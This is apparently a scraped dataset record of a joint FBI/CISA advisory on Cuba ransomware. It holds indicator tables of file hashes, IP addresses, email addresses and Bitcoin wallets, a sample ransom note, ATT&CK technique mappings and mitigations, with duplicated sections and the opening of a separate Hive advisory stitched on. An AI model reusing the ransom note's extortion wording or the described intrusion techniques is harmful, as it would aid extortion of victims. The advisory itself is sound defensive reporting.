SHA256: f8144fa96c036a8204c7bc285e295f9cd2d1deb0379e39ee8a8414531104dc4a




9479p.ps1


 


SHA256: 88d13669a994d2e04ec0a9940f07ab8aab8563eb845a9c13f2b0fec497df5b17




a.exe
 


 


MD5: 03c835b684b21ded9a4ab285e4f686a3
 
SHA1: eaced2fcfdcbf3dca4dd77333aaab055345f3ab4
 
SHA256: 0f385cc69a93abeaf84994e7887cb173e889d309a515b55b2205805bdfe468a3
 
SHA256: 0d5e3483299242bf504bd3780487f66f2ec4f48a7b38baa6c6bc8ba16e4fb605
 
SHA256: 7e00bfb622072f53733074795ab581cf6d1a8b4fc269a50919dda6350209913c
 
SHA256: af4523186fe4a5e2833bbbe14939d8c3bd352a47a2f77592d8adcb569621ce02




a220.bat


 


 




a220.dll


 


SHA256: 8a3d71c668574ad6e7406d3227ba5adc5a230dd3057edddc4d0ec5f8134d76c3




a82.exe


 


SHA256: 4306c5d152cdd86f3506f91633ef3ae7d8cf0dd25f3e37bec43423c4742f4c42




a91.exe


 


SHA256: 3d4502066a338e19df58aa4936c37427feecce9ab8d43abff4a7367643ae39ce




a99.exe


 


SHA256: f538b035c3de87f9f8294bec272c1182f90832a4e86db1e47cbb1ab26c9f3a0b




aa.exe


 


 




aa2.exe


 


 




aaa.stage.16549040.dns.alleivice.com


 


 




add2.exe


 


 




advapi32.dll


 


 




agent.13.ps1


 


 




agent.bat


 


SHA256: fd87ca28899823b37b2c239fbbd236c555bcab7768d67203f86d37ede19dd975




agent.dll


 


 




agent13.bat


 


 




agent13.ps1


 


SHA256: 1817cc163482eb21308adbd43fb6be57fcb5ff11fd74b344469190bb48d8163b




agent64.bin


 


SHA256: bff4dd37febd5465e0091d9ea68006be475c0191bd8c7a79a44fbf4b99544ef1




agsyst121.bat


 


 




agsyst121.dll


 


 




all.bat


 


SHA256: ecefd9bb8b3783a81ab934b44eb3d84df5e58f0289f089ef6760264352cf878a




all.dll


 


SHA256: db3b1f224aec1a7c58946d819d729d0903751d1867113aae5cca87e38c653cf4




anet.exe


 


SHA1: 241ce8af441db2d61f3eb7852f434642739a6cc3
 
SHA256: 74fbf3cc44dd070bd5cb87ca2eed03e1bbeec4fec644a25621052f0a73abbe84
 
SHA256: b160bd46b6efc6d79bfb76cf3eeacca2300050248969decba139e9e1cbeebf53
SHA256: f869e8fbd8aa1f037ad862cf6e8bbbf797ff49556fb100f2197be4ee196a89ae




App.exe


 


 




appnetwork.exe


 


 




AppVClient.man


 


 




aswSP_arPot2


 


 




aus.exe


 


SHA256: 0c2ffed470e954d2bf22807ba52c1ffd1ecce15779c0afdf15c292e3444cf674
SHA256: 310afba59ab8e1bda3ef750a64bf39133e15c89e8c7cf4ac65ee463b26b136ba




av.bat


 


SHA256: b5d202456ac2ce7d1285b9c0e2e5b7ddc03da1cbca51b5da98d9ad72e7f773b8




c2.ps1


 

 



c2.ps1


 


 




cdzehhlzcwvzcmcr.aspx


 


 




check.exe


 


 




checkk.exe


 


 




checkk.txt


 


SHA256: 1f842f84750048bb44843c277edeaa8469697e97c4dbf8dc571ec552266bec9f




client32.exe


 

 



comctl32 .dll


 


 




comp2.ps1


 


 




comps2.ps1


 


 




cqyrrxzhumiklndm.aspx


 


 




defendercontrol.exe


 


 




ff.exe


 


SHA256: 1b943afac4f476d523310b8e3afe7bca761b8cbaa9ea2b9f01237ca4652fc834




File __agsyst121.dll


 

 



File __aswArPot.sys


 


 




File __s9239.dll


 


 




File_agsyst121.dll


 


 




File_aswArPot.sys


 


 




File_s9239.dll


 


 




ga.exe


 


 




gdi32 .dll


 


 




geumspbgvvytqrih.aspx


 


 




IObit UNLOCKER.exe


 


 




kavsa32.exe


 


MD5: 236f5de8620a6255f9003d054f08574b
SHA1: 9b546bd99272cf4689194d698c830a2510194722




kavsyst32.exe


 


 




kernel32.dll


 

 



komar.bat


 


SHA256: B9AFE016DBDBA389000B01CE7645E7EEA1B0A50827CDED1CBAA48FBC715197BB




komar.dll


 


 




komar121.bat


 

 



komar121.dll


 


 




komar2.ps1


 


SHA256: 61971d3cbf88d6658e5209de443e212100afc8f033057d9a4e79000f6f0f7cc4




komar64.dll


 


SHA256: 8E64BACAF40110547B334EADCB0792BDC891D7AE298FBFFF1367125797B6036B




mfcappk32.exe


 

 



newpass.ps1


 


SHA256: c646199a9799b6158de419b1b7e36b46c7b7413d6c35bfffaeaa8700b2dcc427




npalll.exe


 


SHA256: bd270853db17f94c2b8e4bd9fa089756a147ed45cbc44d6c2b0c78f361978906




ole32.dll


 

 



oleaut32.dll


 

 



open.bat


 


SHA256: 2EB3EF8A7A2C498E87F3820510752043B20CBE35B0CBD9AF3F69E8B8FE482676




open.exe


 


 




pass.ps1


 


SHA256: 0afed8d1b7c36008de188c20d7f0e2283251a174261547aab7fb56e31d767666




pdfdecrypt.exe


 


 




powerview.ps1


 

 



prt3389.bat


 


SHA256: e0d89c88378dcb1b6c9ce2d2820f8d773613402998b8dcdb024858010dec72ed




ra.ps1


 


SHA256: 571f8db67d463ae80098edc7a1a0cad59153ce6592e42d370a45df46f18a4ad8




rg1.exe


 

 



Rg2.exe


 


 




rundll32


 

 



s64174.bat


 


SHA256: 10a5612044599128981cb41d71d7390c15e7a2a0c2848ad751c3da1cbec510a2
SHA256: 1807549af1c8fdc5b04c564f4026e41790c554f339514d326f8b55cb7b9b4f79




s64174.dll


 


 




s9239.bat


 


 




s9239.dll


 

 



shell32.dll


 


 




stel.exe


 


 




syskav64.exe


 


 




sysra64,exe


 


 




systav332.bat


 


SHA256: 01242b35b6def71e42cc985e97d618e2fabd616b16d23f7081d575364d09ca74




TC-9.22a.2019.3.exe


 


 




TeamViewer.exe


 


 




testDLL.dll


 

 



tug4rigd.dll


 


SHA256: 952b34f6370294c5a0bb122febfaa80612fef1f32eddd48a3d0556c4286b7474




UpdateNotificationPipeline.002.etl


 


 




user32.dll


 


 




v1.bat


 


 




v2.bat


 

 



v3.bat


 


 




veeamp.exe


 


SHA256: 9aa1f37517458d635eae4f9b43cb4770880ea0ee171e7e4ad155bbdee0cbe732




version.dll


 


 




vlhqbgvudfnirmzx.aspx


 


 




wininet.dll


 


 




wlog.exe


 

 



wpeqawzp.sys


 


 




y3lcx345.dll


 


 




zero.exe


 


SHA256: 3a8b7c1fe9bd9451c0a51e4122605efc98e7e4e13ed117139a13e4749e211ed0



 

 


 




 


 


 




 

Table 2: Cuba Ransomware Associated Email Addresses, as of Late August 2022



Email Provider


Email Addresses




Cuba-supp[.]com


admin@cuba-supp[.]com




Encryption-support[.]com


admin@encryption-support[.]com




Mail.supports24[.]net


inbox@mail.supports24[.]net




 

Table 3: Cuba Ransomware Associated Jabber Address, as of Late August 2022



cuba_support@exploit[.]im




 

Table 4: IP Addresses Associated with Cuba Ransomware, as of Late August 2022
	Note: Some of these observed IP addresses are more than a year old. FBI and CISA recommend vetting or investigating these IP addresses prior to taking forward-looking action such as blocking. 



193.23.244[.]244


144.172.83[.]13


216.45.55[.]30




94.103.9[.]79


149.255.35[.]131


217.79.43[.]148




192.137.101[.]46


154.35.175[.]225


222.252.53[.]33




92.222.172[.]39


159.203.70[.]39


23.227.198[.]246




92.222.172[.]172


171.25.193[.]9


31.184.192[.]44




10.13.102[.]1


185.153.199[.]169


37.120.247[.]39




10.13.102[.]58


192.137.100[.]96


37.44.253[.]21




10.133.78[.]41


192.137.100[.]98


38.108.119[.]121




10.14.100[.]20


192.137.101[.]205


45.164.21[.]13




103.114.163[.]197


193.34.167[.]17


45.32.229[.]66




103.27.203[.]197


194.109.206[.]212


45.86.162[.]34




104.217.8[.]100


195.54.160[.]149


45.91.83[.]176




107.189.10[.]143


199.58.81[.]140


64.52.169[.]174




108.170.31[.]115


204.13.164[.]118


64.235.39[.]82




128.31.0[.]34


209.76.253[.]84


79.141.169[.]220




128.31.0[.]39


212.192.241[.]230


84.17.52[.]135




131.188.40[.]189


213.32.39[.]43


86.59.21[.]38




141.98.87[.]124


216.45.55[.]3


 




 

Table 5: Cuba Bitcoin Wallets Receiving Payments, as of Late August 2022



bc1q4vr25xkth35qslenqwd7aw020w85qrvlrhv7hc




bc1q5uc0fdnz0ve5pg4nl4upa9ly586t6wmnghfe7x




bc1q6rsj3cn37dngypu5kad9gdw5ykhctpwhjvun3z




bc1q6zkemtyyrre2mkk23g93zyq98ygrygvx7z2q0t




bc1q9cj0n9k2m282x0nzj6lhqjvhkkd4h95sewek83




bc1qaselp9nhejc3safcq3vn5wautx6w33x0llk7dl




bc1qc48q628t93xwzljtvurpqhcvahvesadpwqtsza




bc1qgsuf5m9tgxuv4ylxcmx8eeqn3wmlmu7f49zkus




bc1qhpepeeh7hlz5jvrp50uhkz59lhakcfvme0w9qh




bc1qjep0vx2lap93455p7h29unruvr05cs242mrcah




bc1qr9l0gcl0nvmngap6ueyy5gqdwvm34kdmtevjyx




bc1qs3lv77udkap2enxv928x59yuact5df4t95rsqr




bc1qyd05q2m5qt3nwpd3gcqkyer0gspqx5p6evcf7h




bc1qzz7xweq8ee2j35tq6r5m687kctq9huskt50edv




bc1qvpk8ksl3my6kjezjss9p28cqj4dmpmmjx5yl3y




bc1qhtwfcysclc7pck2y3vmjtpzkaezhcm6perc99x




bc1qft3s53ur5uq5ru6sl3zyr247dpr55mnggwucd3




bc1qp7h9fszlqxjwyfhv0upparnsgx56x7v7wfx4x7




bc1q4vr25xkth35qslenqwd7aw020w85qrvlrhv7hc




bc1q5uc0fdnz0ve5pg4nl4upa9ly586t6wmnghfe7x




bc1q6rsj3cn37dngypu5kad9gdw5ykhctpwhjvun3z




bc1q6zkemtyyrre2mkk23g93zyq98ygrygvx7z2q0t




bc1q9cj0n9k2m282x0nzj6lhqjvhkkd4h95sewek83




bc1qaselp9nhejc3safcq3vn5wautx6w33x0llk7dl




bc1qc48q628t93xwzljtvurpqhcvahvesadpwqtsza




bc1qgsuf5m9tgxuv4ylxcmx8eeqn3wmlmu7f49zkus




bc1qhpepeeh7hlz5jvrp50uhkz59lhakcfvme0w9qh




bc1qjep0vx2lap93455p7h29unruvr05cs242mrcah




bc1qr9l0gcl0nvmngap6ueyy5gqdwvm34kdmtevjyx




bc1qs3lv77udkap2enxv928x59yuact5df4t95rsqr




bc1qyd05q2m5qt3nwpd3gcqkyer0gspqx5p6evcf7h




bc1qzz7xweq8ee2j35tq6r5m687kctq9huskt50edv




 
See figure 1 for an example of a Cuba ransomware note.

Figure 1: Sample Cuba Ransom Note 2, as of late August 2022



Greetings! Unfortunately we have to report that your company were 
compromised. All your files were 
encrypted and you can’t restore them without our private key. Trying 
to restore it without our help may 
cause complete loss of your data. Also we researched whole your 
corporate network and downloaded all 
your sensitive data to our servers. If we will not get any contact 
from you in the next 3 days we will public 
it in our news site.
You can find it there ( 
https[:]// cuba4ikm4jakjgmkeztyawtdgr2xymvy6nvgw5cglswg3si76icnqd.onion/ )
Tor Browser is needed ( https[:]//www.torproject.org/download/ )
Also we respect your work and time and we are open for communication. 
In that case we are ready to discuss 
recovering your files and work. We can grant absolute privacy and 
compliance with agreements by our side. 
Also we can provide all necessary evidence to confirm performance of 
our products and statements.
Feel free to contact us with quTox ( https[:]//tox.chat/download.html )
 
Our ToxID: 37790E2D198DFD20C9D2887D4EF7C3E295188842480192689864DCCA3C8BD808A18956768271
 
Alternative method is email: inbox@mail.supports24[.]net
 
Mark your messages with your personal ID: 
 




 
Additional resources to detect possible exploitation or compromise:

Palo Alto Networks Novel News on Cuba Ransomware: Greetings From Tropical Scorpius
BlackBerry blog RomCom Threat Actor Abuses KeePass and SolarWinds to Target Ukraine and Potentially the United Kingdom
BlackBerry blog Unattributed RomCom Threat Actor Spoofing Popular Apps Now Hits Ukrainian Militaries

MITRE ATT&CK TECHNIQUES
Cuba ransomware actors use the ATT&CK techniques listed in Table 6. Note: For details on TTPs listed in the table, see FBI Flash Indicators of Compromise Associated with Cuba Ransomware.




Resource Development




Technique Title


ID


Use




Compromise Infrastructure: Domains


T1584.001


Cuba ransomware actors use compromised networks to conduct their operations.




Initial Access




Technique Title


ID


Use




Valid Accounts


T1078


Cuba ransomware actors have been known to use compromised credentials to get into a victim’s network. 




External Remote Services


T1133


Cuba ransomware actors may leverage external-facing remote services to gain initial access to a victim’s network.




Exploit Public-Facing Application


T1190


Cuba ransomware actors are known to exploit vulnerabilities in public-facing systems.




Phishing


T1566


Cuba ransomware actors have sent phishing emails to obtain initial access to systems.




Execution




Technique Title


ID


Use




Command and Scripting Interpreter: PowerShell


T1059.001


Cuba ransomware actors have used PowerShell to escalate privileges. 




Software Deployment Tools


T1072


Cuba ransomware actors use Hancitor as a tool to spread malicious files throughout a victim’s network.




Privilege Escalation




Technique Title


ID


Use




Exploitation for Privilege Escalation


T1068


Cuba ransomware actors have exploited ZeroLogon to gain administrator privileges.[2]




Defense Evasion




Technique Title


ID


Use




Impair Defenses: Disable or Modify Tools


T1562.001


Cuba ransomware actors leveraged a loader that disables security tools within the victim network.




Lateral Movement




Technique Title


ID


Use




Remote Services Session: RDP Hijacking


T1563.002


Cuba ransomware actors used RDP sessions to move laterally.




Credential Access




Technique Title


ID


Use




Credential Dumping: LSASS Memory


T1003.001


Cuba ransomware actors use LSASS memory to retrieve stored compromised credentials.




Steal or Forge Kerberos Tickets: Kerberoasting


T1558.003


Cuba ransomware actors used the Kerberoasting technique to identify service accounts linked to active directory.[2]




Command and Control




Technique Title


ID


Use




Proxy: Manipulate Command and Control Communications


T1090


Industrial Spy ransomware actors use HTTP/HTTPS proxy via a C2 server to direct traffic to avoid direct connection. [2]





Mitigations

FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Cuba ransomware:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords.
Implement multiple failed login attempt account lockouts.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.
Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching SonicWall firewall vulnerabilities and known exploited vulnerabilities in internet-facing systems. Note: SonicWall maintains a vulnerability list that includes Advisory ID, CVE, and mitigation. Their list can be found at psirt.global.sonicwall.com/vuln-list.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege.
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). JIT sets a network-wide policy in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Maintain offline backups of data, and regularly maintain backup and restoration. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.

RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents immediately. Report to a local FBI Field Office, or CISA at us-cert.cisa.gov/report.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI or CISA.
ACKNOWLEDGEMENTS
FBI and CISA would like to thank BlackBerry, ESET, The National Cyber-Forensics and Training Alliance (NCFTA), Palo Alto Networks, and PRODAFT for their contributions to this CSA.

References

[1] Palo Alto Networks: Tropical Scorpius
[2] Palo Alto Networks: Novel News on Cuba Ransomware - Greetings From Tropical Scorpius
[3] BlackBerry: Unattributed RomCom Threat Actor Spoofing Popular Apps Now Hits Ukrainian Militaries
[4] BlackBerry: RomCom Threat Actor Abuses KeePass and SolarWinds to Target Ukraine and Potentially the United Kingdom

Revisions

December 1, 2022: Initial Version|December 12, 2022: Added new IP addresses and IOCs






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1190', 'T1563.002', 'T1068', 'T1090', 'T1072', 'T1562.001', 'T1003.001', 'T1566', 'T1558.003', 'T1133', 'T1059.001', 'T1584.001', 'T1078'}","




Summary

Actions to take today to mitigate cyber threats from ransomware:

• Prioritize remediating known exploited vulnerabilities.
• Train users to recognize and report phishing attempts.
• Enable and enforce phishing-resistant multifactor authentication.
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The FBI and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known Cuba ransomware IOCs and TTPs associated with Cuba ransomware actors identified through FBI investigations, third-party reporting, and open-source reporting. This advisory updates the December 2021 FBI Flash: Indicators of Compromise Associated with Cuba Ransomware.
Note: While this ransomware is known by industry as “Cuba ransomware,” there is no indication Cuba ransomware actors have any connection or affiliation with the Republic of Cuba.
Since the release of the December 2021 FBI Flash, the number of U.S. entities compromised by Cuba ransomware has doubled, with ransoms demanded and paid on the increase.
This year, Cuba ransomware actors have added to their TTPs, and third-party and open-source reports have identified a possible link between Cuba ransomware actors, RomCom Remote Access Trojan (RAT) actors, and Industrial Spy ransomware actors.
FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Cuba ransomware and other ransomware operations.
Download the PDF version of this report: pdf, 649 kb.
For a downloadable copy of IOCs, see:

AA22-335A.stix (STIX 148 kb).
(Updated December 12, 2022) AA22-335A-2.stix (STIX, 67 kb). (End of Update.)


Technical Details

Overview
Since the December 2021 release of FBI Flash: Indicators of Compromise Associated with Cuba Ransomware, FBI has observed Cuba ransomware actors continuing to target U.S. entities in the following five critical infrastructure sectors: Financial Services, Government Facilities, Healthcare and Public Health, Critical Manufacturing, and Information Technology. As of August 2022, FBI has identified that Cuba ransomware actors have:

Compromised 101 entities, 65 in the United States and 36 outside the United States.
Demanded 145 million U.S. Dollars (USD) and received 60 million USD in ransom payments.

Cuba Ransomware Actors’ Tactics, Techniques, and Procedures
As previously reported by FBI, Cuba ransomware actors have leveraged the following techniques to gain initial access into dozens of entities in multiple critical infrastructure sectors:

Known vulnerabilities in commercial software,
Phishing campaigns,
Compromised credentials,
Legitimate remote desktop protocol (RDP) tools,

After gaining initial access, the actors distributed Cuba ransomware on compromised systems through Hancitor—a loader known for dropping or executing stealers, such as Remote Access Trojans (RATs) and other types of ransomware, onto victims’ networks.
Since spring 2022, Cuba ransomware actors have modified their TTPs and tools to interact with compromised networks and extort payments from victims.,1,2,
Cuba ransomware actors have exploited known vulnerabilities and weaknesses and have used tools to elevate privileges on compromised systems. According to Palo Alto Networks Unit 42,2, Cuba ransomware actors have:

Exploited CVE-2022-24521 in the Windows Common Log File System (CLFS) driver to steal system tokens and elevate privileges.
Used a PowerShell script to identify and target service accounts for their associated Active Directory Kerberos ticket. The actors then collected and cracked the Kerberos tickets offline via Kerberoasting,.
Used a tool, called KerberCache, to extract cached Kerberos tickets from a host’s Local Security Authority Server Service (LSASS) memory,.
Used a tool to exploit CVE-2020-1472 (also known as “ZeroLogon”) to gain Domain Administrative privileges,. This tool and its intrusion attempts have been reportedly related to Hancitor and Qbot.

According to Palo Alto Networks Unit 42, Cuba ransomware actors use tools to evade detection while moving laterally through compromised environments before executing Cuba ransomware. Specifically, the actors, “leveraged a dropper that writes a kernel driver to the file system called ApcHelper.sys. This targets and terminates security products. The dropper was not signed; however, the kernel driver was signed using the certificate found in the LAPSUS NVIDIA leak."",.,2,
In addition to deploying ransomware, the actors have used “double extortion” techniques, in which they exfiltrate victim data, and (1) demand a ransom payment to decrypt it and, (2) threaten to publicly release it if a ransom payment is not made.,2,
Cuba Ransomware Link to RomCom and Industrial Spy Marketplace
Since spring 2022, third-party and open-source reports have identified an apparent link between Cuba ransomware actors, RomCom RAT actors, and Industrial Spy ransomware actors:

According to Palo Alto Networks Unit 42, Cuba ransomware actors began using RomCom malware, a custom RAT, for command and control (C2).,2,
Cuba ransomware actors may also be leveraging Industrial Spy ransomware. According to third-party reporting, suspected Cuba ransomware actors compromised a foreign healthcare company. The threat actors deployed Industrial Spy ransomware, which shares distinct similarities in configuration to Cuba ransomware. Before deploying the ransomware, the actors moved laterally using Impacket and deployed the RomCom RAT and Meterpreter Reverse Shell HTTP/HTTPS proxy via a C2 server,.
Cuba ransomware actors initially used their leak site to sell stolen data; however, around May 2022, the actors began selling their data on Industrial Spy’s online market for selling stolen data.,2,

RomCom actors have targeted foreign military organizations, IT companies, food brokers and manufacturers.,3,4, The actors copied legitimate HTML code from public-facing webpages, modified the code, and then incorporated it in spoofed domains, which allowed the RomCom actors to:

Host counterfeit Trojanized applications for

SolarWinds Network Performance Monitor (NPM),
KeePass password manager,
PDF Reader Pro, (by PDF Technologies, Inc., not an Adobe Acrobat or Reader product), and
Advanced IP Scanner software;


Deploy the RomCom RAT as the final stage.

INDICATORS OF COMPROMISE
See tables 1 through 5 for Cuba ransomware IOCs that FBI obtained during threat response investigations as of late August 2022. In addition to these tables, see the publications in the References section below for aid in detecting possible exploitation or compromise.
Note: For IOCs as of early November 2021, see FBI Flash: Indicators of Compromise Associated with Cuba Ransomware.

 

 

 

 

 
See figure 1 for an example of a Cuba ransomware note.

 
Additional resources to detect possible exploitation or compromise:

Palo Alto Networks Novel News on Cuba Ransomware: Greetings From Tropical Scorpius
BlackBerry blog RomCom Threat Actor Abuses KeePass and SolarWinds to Target Ukraine and Potentially the United Kingdom
BlackBerry blog Unattributed RomCom Threat Actor Spoofing Popular Apps Now Hits Ukrainian Militaries

MITRE ATT&CK TECHNIQUES
Cuba ransomware actors use the ATT&CK techniques listed in Table 6. Note: For details on TTPs listed in the table, see FBI Flash Indicators of Compromise Associated with Cuba Ransomware.


Mitigations

FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Cuba ransomware:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords.
Implement multiple failed login attempt account lockouts.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.
Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching SonicWall firewall vulnerabilities and known exploited vulnerabilities in internet-facing systems. Note: SonicWall maintains a vulnerability list that includes Advisory ID, CVE, and mitigation. Their list can be found at psirt.global.sonicwall.com/vuln-list.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege.
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). JIT sets a network-wide policy in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Maintain offline backups of data, and regularly maintain backup and restoration. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.

RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents immediately. Report to a local FBI Field Office, or CISA at us-cert.cisa.gov/report.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI or CISA.
ACKNOWLEDGEMENTS
FBI and CISA would like to thank BlackBerry, ESET, The National Cyber-Forensics and Training Alliance (NCFTA), Palo Alto Networks, and PRODAFT for their contributions to this CSA.

References,1, Palo Alto Networks: Tropical Scorpius,2, Palo Alto Networks: Novel News on Cuba Ransomware - Greetings From Tropical Scorpius,3, BlackBerry: Unattributed RomCom Threat Actor Spoofing Popular Apps Now Hits Ukrainian Militaries,4, BlackBerry: RomCom Threat Actor Abuses KeePass and SolarWinds to Target Ukraine and Potentially the United Kingdom

Revisions

December 1, 2022: Initial Version|December 12, 2022: Added new IP addresses and IOCs






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-335a
36,"






Actions to Take Today to Mitigate Cyber Threats from Ransomware:




Prioritize remediating known exploited vulnerabilities.
Enable and enforce multifactor authentication with strong passwords.
Close unused ports and remove any application not deemed necessary for day-to-day operations.








Summary

Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) are releasing this joint CSA to disseminate known Hive IOCs and TTPs identified through FBI investigations as recently as November 2022.
FBI, CISA, and HHS encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. Victims of ransomware operations should report the incident to their local FBI field office or CISA.
Download the PDF version of this report: pdf, 852.9 kb.
For a downloadable copy of IOCs, see AA22-321A.stix (STIX, 43.6 kb).

Technical Details

Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
